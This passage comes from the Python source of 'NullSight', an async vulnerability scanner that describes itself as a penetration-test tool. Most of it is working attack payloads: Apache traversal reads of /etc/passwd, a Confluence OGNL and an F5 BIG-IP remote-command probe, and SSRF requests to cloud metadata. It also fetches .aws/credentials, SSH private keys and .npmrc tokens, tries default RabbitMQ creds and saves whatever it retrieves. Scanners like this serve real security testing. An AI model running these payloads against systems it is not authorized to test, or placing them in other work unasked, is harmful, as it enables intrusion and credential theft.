    Probe("/?page=..%252f..%252f..%252fetc%252fpasswd",     "LFI double URL-encoded"),

    # ── CVE-2021-41773 / CVE-2021-42013 Apache ────────────────
    Probe("/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
          "Apache CVE-2021-41773 cgi",    cve="CVE-2021-41773"),
    Probe("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
          "Apache CVE-2021-42013 dbl",    cve="CVE-2021-42013"),
    Probe("/.%2e/.%2e/.%2e/.%2e/etc/passwd",
          "Apache CVE-2021-41773 no-cgi", cve="CVE-2021-41773"),
    Probe("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
          "Apache icons traversal",       cve="CVE-2021-41773"),

    # ── SPRING BOOT ACTUATOR ───────────────────────────────────
    Probe("/actuator/env",              "Spring /actuator/env"),
    Probe("/actuator/health",           "Spring /actuator/health"),
    Probe("/actuator/mappings",         "Spring /actuator/mappings"),
    Probe("/actuator/beans",            "Spring /actuator/beans"),
    Probe("/actuator/configprops",      "Spring /actuator/configprops"),
    Probe("/actuator/heapdump",         "Spring /actuator/heapdump"),
    Probe("/actuator/httptrace",        "Spring /actuator/httptrace"),
    Probe("/actuator/loggers",          "Spring /actuator/loggers"),
    Probe("/actuator/threaddump",       "Spring /actuator/threaddump"),
    Probe("/actuator/metrics",          "Spring /actuator/metrics"),

    # ── CVE-2023-34035 Spring Security ..;/ bypass ─────────────
    Probe("/secure/..;/actuator/env",   "Spring ..;/ bypass",    cve="CVE-2023-34035"),
    Probe("/login/..;/actuator/env",    "Spring login bypass",   cve="CVE-2023-34035"),

    # ── CVE-2024-27198/27199 TeamCity ─────────────────────────
    Probe("/app/rest/users",            "TeamCity users",        cve="CVE-2024-27198"),
    Probe("/app/rest/server",           "TeamCity server",       cve="CVE-2024-27198"),
    Probe("/app/rest/users/id:1/tokens","TeamCity admin token",  cve="CVE-2023-42793"),
    Probe("/res/projectPlugin.html;.jsp","TeamCity ;.ext bypass",cve="CVE-2024-27199"),

    # ── CVE-2022-26134 / CVE-2021-26084 Confluence ─────────────
    Probe("/pages/doenterpagevariables.action",
          "Confluence OGNL",            cve="CVE-2021-26084"),
    Probe("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/",
          "Confluence OGNL RCE",        cve="CVE-2022-26134"),
    Probe("/setup/setupadministrator.action",
          "Confluence setup bypass",    cve="CVE-2023-22518"),

    # ── CVE-2022-1388 F5 BIG-IP ───────────────────────────────
    Probe("/mgmt/tm/util/bash",
          "BIG-IP bash RCE",            cve="CVE-2022-1388",
          method="POST",
          body={"command": "run", "utilCmdArgs": "-c id"},
          extra_headers={"X-F5-Auth-Token": ""}),
    Probe("/mgmt/shared/authn/login",   "BIG-IP auth",          cve="CVE-2022-1388"),
    Probe("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
          "BIG-IP TMUI traversal",      cve="CVE-2020-5902"),

    # ── CVE-2024-3400 Palo Alto PAN-OS ────────────────────────
    Probe("/global-protect/login.esp",      "PAN-OS GP login",   cve="CVE-2024-3400"),
    Probe("/ssl-vpn/hipreportcheck.esp",    "PAN-OS HIP",        cve="CVE-2024-3400"),
    Probe("/global-protect/getconfig.esp",  "PAN-OS getconfig",  cve="CVE-2024-3400"),

    # ── CVE-2019-11510 Pulse Secure ───────────────────────────
    Probe("/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd"
          "?/dana/html5acc/guacamole/",
          "Pulse Secure LFI",           cve="CVE-2019-11510"),

    # ── CVE-2018-13379 FortiOS ────────────────────────────────
    Probe("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
          "FortiOS LFI",                cve="CVE-2018-13379"),

    # ── CVE-2024-1709 ConnectWise ─────────────────────────────
    Probe("/SetupWizard.aspx/",         "ScreenConnect setup",  cve="CVE-2024-1709"),

    # ── GRAPHQL ───────────────────────────────────────────────
    Probe("/graphql",
          "GraphQL introspection",
          method="POST",
          body={"query": "{__schema{types{name fields{name}}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/api/graphql",
          "GraphQL /api",
          method="POST",
          body={"query": "{__schema{queryType{name}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/graphiql",                  "GraphiQL IDE"),
    Probe("/playground",                "GraphQL Playground"),

    # ── SSRF PROBES ───────────────────────────────────────────
    Probe("/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
          "SSRF AWS ?url="),
    Probe("/api/v1/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
          "SSRF GCP ?url=",
          extra_headers={"Metadata-Flavor": "Google"}),
    Probe("/proxy?url=http://169.254.169.254/latest/meta-data/",
          "SSRF proxy param AWS"),

    # ── NUXT / NEXT.JS DEVTOOLS ───────────────────────────────
    Probe("/__nuxt_devtools__/client/",  "Nuxt DevTools"),
    Probe("/__webpack_hmr",              "Webpack HMR"),
    Probe("/webpack-dev-server",         "Webpack DevServer"),
    Probe("/.webpack/stats.json",        "Webpack stats.json"),

    # ── NGINX ALIAS OFF-BY-SLASH ──────────────────────────────
    Probe("/static../etc/passwd",        "Nginx alias LFI /static"),
    Probe("/files../etc/passwd",         "Nginx alias LFI /files"),
    Probe("/assets../../../etc/passwd",  "Nginx alias LFI /assets"),
    Probe("/nginx_status",               "Nginx stub_status"),

    # ── SUPPLY CHAIN / CONFIG ─────────────────────────────────
    Probe("/.npmrc",                     ".npmrc auth token"),
    Probe("/.netrc",                     ".netrc credentials"),
    Probe("/.aws/credentials",           ".aws/credentials"),
    Probe("/aws_credentials",            "aws_credentials"),
    Probe("/docker-compose.yml",         "docker-compose.yml"),
    Probe("/docker-compose.yaml",        "docker-compose.yaml"),
    Probe("/kubernetes.yml",             "kubernetes.yml"),
    Probe("/k8s/secrets.yaml",           "k8s/secrets.yaml"),

    # ── LINUX SYSTEM FILES ────────────────────────────────────
    Probe("/proc/self/environ",          "proc/self/environ"),
    Probe("/proc/self/cmdline",          "proc/self/cmdline"),
    Probe("/.htpasswd",                  ".htpasswd"),
    Probe("/.ssh/id_rsa",                ".ssh/id_rsa"),
    Probe("/.ssh/authorized_keys",       ".ssh/authorized_keys"),
    Probe("/.bash_history",              ".bash_history"),

    # ── PHP INFO ──────────────────────────────────────────────
    Probe("/phpinfo.php",                "phpinfo.php"),
    Probe("/info.php",                   "info.php"),

    # ── WP CONFIG ─────────────────────────────────────────────
    Probe("/wp-config.php.bak",          "wp-config.php.bak"),
    Probe("/wp-config.php~",             "wp-config.php~"),
    Probe("/wp-config.php.swp",          "wp-config.php.swp"),
    Probe("/wp-config.php.old",          "wp-config.php.old"),

    # ── LARAVEL DEBUG PANELS ──────────────────────────────────
    Probe("/telescope/requests",         "Laravel Telescope"),
    Probe("/_debugbar/open",             "Laravel DebugBar"),
    Probe("/log-viewer",                 "Laravel Log Viewer"),

    # ── YII2 DEBUG ────────────────────────────────────────────
    Probe("/debug/default/view",         "Yii2 debug panel"),
    Probe("/index.php?r=debug/default/view", "Yii2 debug view"),

    # ── RAILS DEBUG ───────────────────────────────────────────
    Probe("/rails/info/properties",      "Rails info properties"),
    Probe("/rails/mailers",              "Rails mailer preview"),

    # ── SPRING OLD ENDPOINTS ──────────────────────────────────
    Probe("/env",                        "Spring /env"),
    Probe("/trace",                      "Spring /trace"),
    Probe("/health",                     "Spring /health"),
    Probe("/dump",                       "Spring /dump"),

    # ── ELASTICSEARCH ─────────────────────────────────────────
    Probe("/_cat/indices?v",             "Elasticsearch indices"),
    Probe("/_cluster/health",            "Elasticsearch health"),

    # ── TOMCAT ────────────────────────────────────────────────
    Probe("/WEB-INF/web.xml",            "Tomcat WEB-INF/web.xml"),
    Probe("/WEB-INF/classes/application.properties", "WEB-INF app.properties"),
    Probe("/manager/html",               "Tomcat Manager UI"),

    # ── DATABASE/BACKUP FILES ─────────────────────────────────
    Probe("/backup.sql",                 "backup.sql"),
    Probe("/dump.sql",                   "dump.sql"),
    Probe("/db.sqlite3",                 "db.sqlite3"),
    Probe("/database.sql",               "database.sql"),
    Probe("/config/database.yml",        "config/database.yml"),
    Probe("/database.yml",               "database.yml"),

    # ── GENERIC PATH TRAVERSAL ────────────────────────────────
    Probe("/%2e%2e/%2e%2e/etc/passwd",               "URL-encoded traversal"),
    Probe("/.%2e/.%2e/etc/passwd",                   "Dot-slash traversal"),
    Probe("/..%c0%af..%c0%afetc%c0%afpasswd",        "UTF-8 overlong traversal"),
    Probe("/%252e%252e%252f%252e%252e%252fetc%252fpasswd","Double URL-enc traversal"),
    Probe("/..;/..;/etc/passwd",                     "Semicolon bypass traversal"),

    # ── PROTOTYPE POLLUTION PROBE ─────────────────────────────
    Probe("/api/test",
          "Prototype pollution probe",
          method="POST",
          body={"__proto__": {"polluted": "NULLSIGHT_TEST_7731"}},
          extra_headers={"Content-Type": "application/json"}),
]

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  MODULE 2: SYSTEM SERVICE SCANNER
#  Checks common ports for unauthenticated/misconfigured services
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ServiceFinding:
    host:        str
    port:        int
    service:     str
    severity:    str
    description: str
    banner:      str   = ""
    tags:        list  = field(default_factory=list)
    timestamp:   str   = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class ServiceCheck:
    port:        int
    service:     str
    severity:    str
    description: str
    tags:        list = field(default_factory=list)
    # Optional: send this bytes, check if response contains confirm_pattern
    probe_bytes:    Optional[bytes]  = None
    confirm_pattern: Optional[bytes] = None
    # If None confirm_pattern → just banner-grab and check banner_pattern
    banner_pattern: Optional[re.Pattern] = None

# Service checks — each confirmed only if banner/response matches
SERVICE_CHECKS: list[ServiceCheck] = [

    # FTP Anonymous
    ServiceCheck(
        port=21, service="FTP",
        severity="CRITICAL",
        description="FTP anonymous login enabled — unauthenticated file access",
        tags=["ftp", "anonymous"],
        probe_bytes=b"USER anonymous\r\n",
        confirm_pattern=b"331",
        banner_pattern=re.compile(rb'220.*ftp|vsftpd|proftpd|filezilla', re.I),
    ),

    # SSH version disclosure
    ServiceCheck(
        port=22, service="SSH",
        severity="HIGH",
        description="SSH service exposed — banner/version disclosure",
        tags=["ssh"],
        banner_pattern=re.compile(rb'SSH-\d+\.\d+-(OpenSSH|Dropbear)', re.I),
    ),

    # SMTP open relay probe
    ServiceCheck(
        port=25, service="SMTP",
        severity="HIGH",
        description="SMTP service exposed — check for open relay",
        tags=["smtp"],
        banner_pattern=re.compile(rb'220.*SMTP|Postfix|Exim|Sendmail|MailEnable', re.I),
    ),

    # Redis unauthenticated
    ServiceCheck(
        port=6379, service="Redis",
        severity="CRITICAL",
        description="Redis exposed without authentication — full data access/RCE",
        tags=["redis", "database"],
        probe_bytes=b"PING\r\n",
        confirm_pattern=b"+PONG",
        banner_pattern=re.compile(rb'\+PONG|\$\d+\r\n', re.I),
    ),

    # MongoDB unauthenticated
    ServiceCheck(
        port=27017, service="MongoDB",
        severity="CRITICAL",
        description="MongoDB exposed — unauthenticated database access",
        tags=["mongodb", "database"],
        # MongoDB wire protocol isMaster
        probe_bytes=bytes.fromhex(
            "3a000000" "00000000" "00000000" "d4070000"
            "00000000" "00000000" "00000000" "14000000"
            "01" "69734d61737465720000000000f03f" "00"
        ),
        confirm_pattern=b"ismaster",
        banner_pattern=re.compile(rb'ismaster|MongoDB', re.I),
    ),

    # Elasticsearch unauthenticated (HTTP)
    ServiceCheck(
        port=9200, service="Elasticsearch",
        severity="CRITICAL",
        description="Elasticsearch exposed on HTTP — unauthenticated data access",
        tags=["elasticsearch", "database"],
        probe_bytes=b"GET / HTTP/1.0\r\n\r\n",
        confirm_pattern=b"cluster_name",
        banner_pattern=re.compile(rb'cluster_name|elasticsearch', re.I),
    ),

    # Memcached unauthenticated
    ServiceCheck(
        port=11211, service="Memcached",
        severity="CRITICAL",
        description="Memcached exposed — unauthenticated cache access",
        tags=["memcached", "database"],
        probe_bytes=b"stats\r\n",
        confirm_pattern=b"STAT",
        banner_pattern=re.compile(rb'STAT\s+\w+', re.I),
    ),

    # MySQL exposed
    ServiceCheck(
        port=3306, service="MySQL",
        severity="CRITICAL",
        description="MySQL port open — check for unauthenticated access or weak creds",
        tags=["mysql", "database"],
        banner_pattern=re.compile(rb'mysql|MariaDB|\x00.*mysql_native_password', re.I),
    ),

    # PostgreSQL exposed
    ServiceCheck(
        port=5432, service="PostgreSQL",
        severity="HIGH",
        description="PostgreSQL port open — check for trust auth or weak creds",
        tags=["postgresql", "database"],
        banner_pattern=re.compile(rb'PostgreSQL|\x00\x00\x00\x08\x04\xd2\x16/', re.I),
    ),

    # RabbitMQ management
    ServiceCheck(
        port=15672, service="RabbitMQ Management",
        severity="CRITICAL",
        description="RabbitMQ management UI exposed — default guest/guest creds?",
        tags=["rabbitmq", "amqp"],
        probe_bytes=b"GET /api/overview HTTP/1.0\r\nAuthorization: Basic Z3Vlc3Q6Z3Vlc3Q=\r\n\r\n",
        confirm_pattern=b"rabbitmq_version",
        banner_pattern=re.compile(rb'rabbitmq_version|management_version', re.I),
    ),

    # Docker daemon
    ServiceCheck(
        port=2375, service="Docker Daemon",
        severity="CRITICAL",
        description="Docker daemon exposed unauthenticated — full container/host control",
        tags=["docker", "rce"],
        probe_bytes=b"GET /version HTTP/1.0\r\n\r\n",
        confirm_pattern=b"ApiVersion",
        banner_pattern=re.compile(rb'ApiVersion|DockerVersion', re.I),
    ),

    # Kubernetes API
    ServiceCheck(
        port=8080, service="Kubernetes API (insecure)",
        severity="CRITICAL",
        description="Kubernetes insecure API port — unauthenticated cluster access",
        tags=["k8s"],
        probe_bytes=b"GET /api/v1/namespaces HTTP/1.0\r\n\r\n",
        confirm_pattern=b"namespaces",
        banner_pattern=re.compile(rb'"namespaces"|"apiVersion"', re.I),
    ),

    # Kubernetes API secure but open
    ServiceCheck(
        port=6443, service="Kubernetes API",
        severity="HIGH",
        description="Kubernetes API port open — check RBAC and auth",
        tags=["k8s"],
        banner_pattern=re.compile(rb'Kubernetes|k8s', re.I),
    ),

    # Grafana default port
    ServiceCheck(
        port=3000, service="Grafana",
        severity="HIGH",
        description="Grafana exposed — check for default admin/admin credentials",
        tags=["grafana", "monitoring"],
        probe_bytes=b"GET /api/org HTTP/1.0\r\n\r\n",
        confirm_pattern=b"orgId",
        banner_pattern=re.compile(rb'Grafana|orgId', re.I),
    ),

    # Kibana
    ServiceCheck(
        port=5601, service="Kibana",
        severity="HIGH",
        description="Kibana exposed — unauthenticated Elasticsearch UI",
        tags=["kibana", "elasticsearch"],
        probe_bytes=b"GET /api/status HTTP/1.0\r\n\r\n",
        confirm_pattern=b"kibana",
        banner_pattern=re.compile(rb'kibana|"version"', re.I),
    ),

    # SMB
    ServiceCheck(
        port=445, service="SMB",
        severity="HIGH",
        description="SMB exposed — check for null sessions and EternalBlue",
        tags=["smb", "windows"],
        banner_pattern=re.compile(rb'SMB|\xffSMB', re.I),
    ),

    # LDAP
    ServiceCheck(
        port=389, service="LDAP",
        severity="HIGH",
        description="LDAP exposed — check for anonymous bind",
        tags=["ldap", "auth"],
        banner_pattern=re.compile(rb'ldap|OpenLDAP|Active Directory', re.I),
    ),

    # VNC
    ServiceCheck(
        port=5900, service="VNC",
        severity="CRITICAL",
        description="VNC service exposed — check for no-auth or weak password",
        tags=["vnc", "remote"],
        banner_pattern=re.compile(rb'RFB \d+\.\d+', re.I),
    ),

    # Jupyter Notebook
    ServiceCheck(
        port=8888, service="Jupyter Notebook",
        severity="CRITICAL",
        description="Jupyter Notebook exposed — direct code execution on server",
        tags=["jupyter", "rce"],
        probe_bytes=b"GET /api HTTP/1.0\r\n\r\n",
        confirm_pattern=b"version",
        banner_pattern=re.compile(rb'"version".*"notebook"', re.I),
    ),
]

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Finding:
    url:            str
    path:           str
    label:          str
    method:         str
    status_code:    int
    content_length: int
    signature_name: str
    severity:       str
    description:    str
    cve:            str
    tags:           list
    snippet:        str
    entropy_flag:   bool  = False
    saved_file:     str   = ""
    timestamp:      str   = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class Stats:
    total:      int   = 0
    done:       int   = 0
    errors:     int   = 0
    findings:   int   = 0
    throttled:  int   = 0
    sys_checks: int   = 0
    sys_findings: int = 0
    start_time: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def rps(self) -> float:
        return self.done / max(self.elapsed, 1)

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  FALSE-POSITIVE FILTER  — strict, multi-layer
#  Layer 1: content-length guard
#  Layer 2: soft-404 / generic-page detection
#  Layer 3: HTML response → only html_allowed sigs may fire
#  Layer 4: required_path_pattern check
#  Layer 5: signature-specific extra checks
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# Patterns indicating a soft-404 / generic page
SOFT_404 = re.compile(
    r'404\s*not\s*found|page\s*not\s*found|does\s*not\s*exist|no\s*such\s*file|'
    r'error\s*404|<title>\s*(?:404|error|not found)|oops[!,]?|nothing\s*here|'
    r'resource not found|access denied|forbidden|under construction|coming soon|'
    r'page not available|нет страницы|sahifa topilmadi|страница не найдена',
    re.I)

# Patterns indicating a generic CMS/framework homepage (FP triggers)
GENERIC_PAGE = re.compile(
    r'<meta\s+name="csrf-(?:token|param)"|'
    r'<meta\s+name="viewport"\s+content="width=device-width|'
    r'window\.__NUXT__|__NEXT_DATA__|ng-version=|react-root|'
    r'wp-content/themes|wp-includes/js',
    re.I)

# Redirect / login page indicators
LOGIN_PAGE = re.compile(
    r'<form[^>]+action[^>]+login|'
    r'type=["\']password["\'].*?type=["\']submit|'
    r'name=["\']password["\']',
    re.I | re.S)

def is_false_positive(
    ct: str, cl: int, body: bytes,
    sig: Signature, path: str = "", status: int = 200,
) -> bool:
    """Return True if this match should be discarded as a false positive."""

    # Layer 1: minimum content length
    if cl < sig.min_content_length:
        return True

    text = body.decode("utf-8", errors="replace")

    # Layer 2: soft-404 / generic error page
    if SOFT_404.search(text[:3000]):
        return True

    # Layer 3: HTML response handling
    is_html = bool(re.search(r'text/html|application/xhtml', ct, re.I))
    if is_html and not sig.html_allowed:
        return True

    # Layer 3b: Even html_allowed sigs must not fire on generic pages
    if is_html and sig.html_allowed:
        # If the page looks like a normal site homepage → FP
        if GENERIC_PAGE.search(text[:2000]):
            # Unless the signature pattern is highly specific (RCE output etc.)
            # Block for debug/missconfig sigs that need Yii-specific debug UI
            if "debug" in sig.name.lower() or "missconfig" in " ".join(sig.tags):
                # Check: does the page actually contain debug-specific content?
                debug_indicators = re.compile(
                    r'yii\s+Debug|Yii2\s+Debug\s+Panel|'
                    r"You're seeing this error because you have DEBUG|"
                    r'Illuminate\\.*?Exception|Application Trace.*?Framework Trace|'
                    r'app_debug.*?true|app_env.*?(?:local|dev)',
                    re.I | re.S)
                if not debug_indicators.search(text):
                    return True

    # Layer 4: required_path_pattern check
    if sig.required_path_pattern is not None:
        if not sig.required_path_pattern.search(path):
            return True

    # Layer 5: signature-specific validation

    # Env: must have at least 3 KEY=VALUE lines
    if sig.name == "Generic env block":
        matches = re.findall(r'^[A-Za-z_][A-Za-z0-9_]{2,39}=.+$', text, re.M)
        if len(matches) < 3:
            return True

    # php://filter base64: must be long and look like base64
    if "php://filter" in sig.name.lower() or "base64 leak" in sig.name.lower():
        b64_lines = re.findall(r'^[A-Za-z0-9+/]{100,}={0,2}$', text, re.M)
        if not b64_lines:
            return True

    # High-entropy: verify entropy actually exceeds threshold
    if "high-entropy" in sig.name.lower():
        m = re.search(
            r'(?:key|secret|token|password|api_key)\s*[=:]\s*["\']?([A-Za-z0-9+/=_\-]{32,})',
            text, re.I)
        if m and shannon_entropy(m.group(1)) < 4.0:
            return True

    # GraphQL: must have schema type names, not just an error
    if sig.name == "GraphQL introspection enabled":
        if not re.search(r'"name"\s*:\s*"[A-Za-z]+Type|Query|Mutation"', text, re.I):
            # Still allow if __schema is clearly present
            if '"__schema"' not in text and "__schema" not in text:
                return True

    # Directory listing: must have multiple file links
    if sig.name == "Directory listing enabled":
        links = re.findall(r'href=["\'][^"\'?#]+["\']', text)
        if len(links) < 3:
            return True

    return False

# ─────────────────────────────────────────────────────────────────────────────
# SAVE FILE
# ─────────────────────────────────────────────────────────────────────────────
async def save_found_file(
    root_url: str, path: str, label: str,
    status_code: int, content_type: str,
    body: bytes, output_dir: Path, console: Console,
) -> str:
    ext        = save_extension(path, content_type, body)
    parsed     = urlparse(root_url)
    domain     = parsed.netloc.replace(".", "_").replace(":", "_")
    ts         = datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")[:19]
    safe_label = re.sub(r'[/\\:*?"<>|]', "_", label)[:60]
    filename   = f"found_{ts}_{domain}_{safe_label}{ext}"
    filepath   = output_dir / filename

    try:
        if ext in (".txt", ".json", ".html"):
            text = body.decode("utf-8", errors="replace")
            with open(filepath, "w", encoding="utf-8") as f:
                if ext != ".json":
                    f.write(f"# NullSight Finding\n# URL: {root_url}{path}\n"
                            f"# Label: {label}\n# Status: {status_code}\n"
                            f"# CT: {content_type}\n# Size: {len(body)} bytes\n"
                            f"# Timestamp: {ts}\n{'─'*60}\n\n")
                try:
                    if ext == ".json":
                        f.write(json.dumps(json.loads(text), indent=2, ensure_ascii=False))
                    else:
                        f.write(text)
                except Exception:
                    f.write(text)
        else:
            with open(filepath, "wb") as f:
                f.write(body)

        console.print(f"  [bold green]✓ saved → {filename}[/bold green]")
        return filename
    except Exception as e:
        console.print(f"  [red]✗ save error: {e}[/red]")
        return ""

# ─────────────────────────────────────────────────────────────────────────────
# HTTP FETCH
# ─────────────────────────────────────────────────────────────────────────────
async def fetch(
    session: aiohttp.ClientSession,
    url: str, probe: Probe,
    stats: Stats, retries: int = 0,
) -> Optional[tuple[int, str, int, bytes]]:
    headers = {
        "User-Agent":      random.choice(CONFIG.user_agents),
        "Accept":          "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "keep-alive",
    }
    if probe.extra_headers:
        headers.update(probe.extra_headers)

    timeout = aiohttp.ClientTimeout(
        total=CONFIG.timeout,
        connect=CONFIG.connect_timeout,
        sock_read=CONFIG.read_timeout,
    )
    kwargs: dict = dict(headers=headers, timeout=timeout,
                        allow_redirects=True, max_redirects=5, ssl=False)
    if probe.method == "POST" and probe.body:
        kwargs["json"] = probe.body

    try:
        async with session.request(probe.method, url, **kwargs) as resp:
            status = resp.status
            if status in (429, 503):
                stats.throttled += 1
                await asyncio.sleep(min(2 ** retries + random.uniform(0, 0.5), 15.0))
                if retries < CONFIG.max_retries:
                    return await fetch(session, url, probe, stats, retries + 1)
                return None

            if status not in (200, 301, 302, 307, 308):
                return None

            ct     = resp.headers.get("Content-Type", "")
            cl_hdr = resp.headers.get("Content-Length", "-1")
            cl     = int(cl_hdr) if cl_hdr.lstrip("-").isdigit() else -1

            body = b""
            async for chunk in resp.content.iter_chunked(4096):
                body += chunk
                if len(body) >= CONFIG.max_body_bytes:
                    break
            if cl == -1:
                cl = len(body)

            return status, ct, cl, body

    except Exception:
        pass

    stats.errors += 1
    return None

# ─────────────────────────────────────────────────────────────────────────────
# MODULE 2: ASYNC SERVICE SCANNER
# ─────────────────────────────────────────────────────────────────────────────
async def check_service(
    host: str,
    check: ServiceCheck,
    timeout: int,
) -> Optional[ServiceFinding]:
    """Try to connect to host:port and confirm the service."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, check.port),
            timeout=timeout,
        )
    except Exception:
        return None  # port closed or filtered

    banner = b""
    try:
        # Send probe if defined
        if check.probe_bytes:
            writer.write(check.probe_bytes)
            await writer.drain()

        # Read banner (up to 2KB)
        try:
            banner = await asyncio.wait_for(reader.read(2048), timeout=timeout)
        except asyncio.TimeoutError:
            pass

    except Exception:
        pass
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass

    if not banner:
        return None

    # Confirm: if confirm_pattern set, response must contain it
    if check.confirm_pattern and check.confirm_pattern not in banner:
        return None

    # If no confirm_pattern, check banner_pattern
    if check.banner_pattern and not check.banner_pattern.search(banner):
        return None

    banner_str = banner.decode("utf-8", errors="replace")[:300].strip()

    return ServiceFinding(
        host=host,
        port=check.port,
        service=check.service,
        severity=check.severity,
        description=check.description,
        banner=banner_str,
        tags=check.tags,
    )

async def run_system_scan(
    hosts: list[str],
    stats: Stats,
    console: Console,
    output_dir: Path,
) -> list[ServiceFinding]:
    """Module 2: Run service checks against all target hosts."""
    console.print(f"\n[bold cyan]Module 2: System Service Scan[/bold cyan] "
                  f"— {len(hosts)} hosts × {len(SERVICE_CHECKS)} service checks\n")

    findings: list[ServiceFinding] = []
    total = len(hosts) * len(SERVICE_CHECKS)
    stats.sys_checks = total

    semaphore = asyncio.Semaphore(200)  # limit concurrent socket connections

    async def bounded_check(host: str, check: ServiceCheck):
        async with semaphore:
            return await check_service(host, check, CONFIG.sys_scan_timeout)

    tasks = []
    for host in hosts:
        for check in SERVICE_CHECKS:
            tasks.append(bounded_check(host, check))

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[cyan]{task.completed}/{task.total}"),
        TextColumn("[red]svc findings: {task.fields[findings]}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task("Service scanning…", total=total, findings=0)

        chunk_size = 500
        for i in range(0, len(tasks), chunk_size):
            chunk   = tasks[i:i + chunk_size]
            results = await asyncio.gather(*chunk)
            for result in results:
                progress.update(task_id, advance=1, findings=stats.sys_findings)
                if result is not None:
                    findings.append(result)
                    stats.sys_findings += 1
                    color = "bold red" if result.severity == "CRITICAL" else "red"
                    console.print(
                        f"  [{color}][{result.severity}][/{color}] "
                        f"[green]{result.host}:{result.port}[/green]  "
                        f"[dim]→ {result.service} — {result.description[:60]}[/dim]"
                    )

    return findings

# ─────────────────────────────────────────────────────────────────────────────
# HTTP WORKER
# ─────────────────────────────────────────────────────────────────────────────
async def worker(
    queue: asyncio.Queue,
    session: aiohttp.ClientSession,
    stats: Stats,
    findings: list,
    progress, task_id,
    console: Console,
    output_dir: Path,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break

        root_url, probe = item
        full_url = root_url.rstrip("/") + "/" + probe.path.lstrip("/")

        if CONFIG.delay_max > 0:
            await asyncio.sleep(random.uniform(CONFIG.delay_min, CONFIG.delay_max))

        result = await fetch(session, full_url, probe, stats)
        stats.done += 1

        if result is not None:
            status, ct, cl, body = result
            text     = body.decode("utf-8", errors="replace")
            matched  = False
            saved_fn = ""
            fired    = set()

            for sig in SIGNATURES:
                if sig.name in fired:
                    continue

                haystack = body if sig.is_bytes else text
                try:
                    match = sig.pattern.search(haystack)
                except TypeError:
                    continue

                if match and not is_false_positive(ct, cl, body, sig, probe.path, status):
                    entropy_flag = has_high_entropy_secret(text)
                    f = Finding(
                        url=full_url, path=probe.path, label=probe.label,
                        method=probe.method, status_code=status,
                        content_length=cl,
                        signature_name=sig.name,
                        severity=sig.severity,
                        description=sig.description,
                        cve=probe.cve or sig.cve,
                        tags=sig.tags,
                        snippet=text[:400].strip(),
                        entropy_flag=entropy_flag,
                    )
                    findings.append(f)
                    stats.findings += 1
                    matched = True
                    fired.add(sig.name)

                    color = {"CRITICAL":"bold red","HIGH":"red",
                             "MEDIUM":"yellow","LOW":"cyan"}.get(sig.severity, "white")
                    cve_str = (f"[bold cyan][{probe.cve or sig.cve}][/bold cyan] "
                               if (probe.cve or sig.cve) else "")
                    console.print(
                        f"  [{color}][{sig.severity}][/{color}] "
                        f"{cve_str}"
                        f"[green]{full_url}[/green]  "
                        f"[dim]→ {sig.name}[/dim]"
                    )

            if matched and not saved_fn:
                saved_fn = await save_found_file(
                    root_url, probe.path, probe.label,
                    status, ct, body, output_dir, console)
                for f in findings:
                    if f.url == full_url and not f.saved_file:
                        f.saved_file = saved_fn

        progress.update(task_id, advance=1, rps=stats.rps, findings=stats.findings)
        queue.task_done()

# ─────────────────────────────────────────────────────────────────────────────
# PRODUCER
# ─────────────────────────────────────────────────────────────────────────────
async def producer(queue: asyncio.Queue, urls: list) -> None:
    for url in urls:
        for probe in PROBES:
            await queue.put((url, probe))
    for _ in range(CONFIG.concurrency):
        await queue.put(None)

# ─────────────────────────────────────────────────────────────────────────────
# REPORTING
# ─────────────────────────────────────────────────────────────────────────────
def save_json(findings: list, svc_findings: list, path: Path) -> None:
    data = {
        "http_findings":    [asdict(f) for f in findings],
        "service_findings": [asdict(f) for f in svc_findings],
    }
    with open(path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def save_csv(findings: list, path: Path) -> None:
    if not findings: return
    fields = list(asdict(findings[0]).keys())
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for finding in findings:
            row = asdict(finding)
            row["tags"] = ", ".join(row["tags"])
            w.writerow(row)

def save_markdown(
    findings: list, svc_findings: list,
    stats: Stats, path: Path,
) -> None:
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
    all_http  = sorted(findings,     key=lambda x: sev_order.get(x.severity, 5))
    all_svc   = sorted(svc_findings, key=lambda x: sev_order.get(x.severity, 5))

    with open(path, "w", encoding="utf-8") as f:
        f.write("# NullSight v2.0 — Penetration Test Report\n\n")
        f.write(f"**Date**: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  \n")
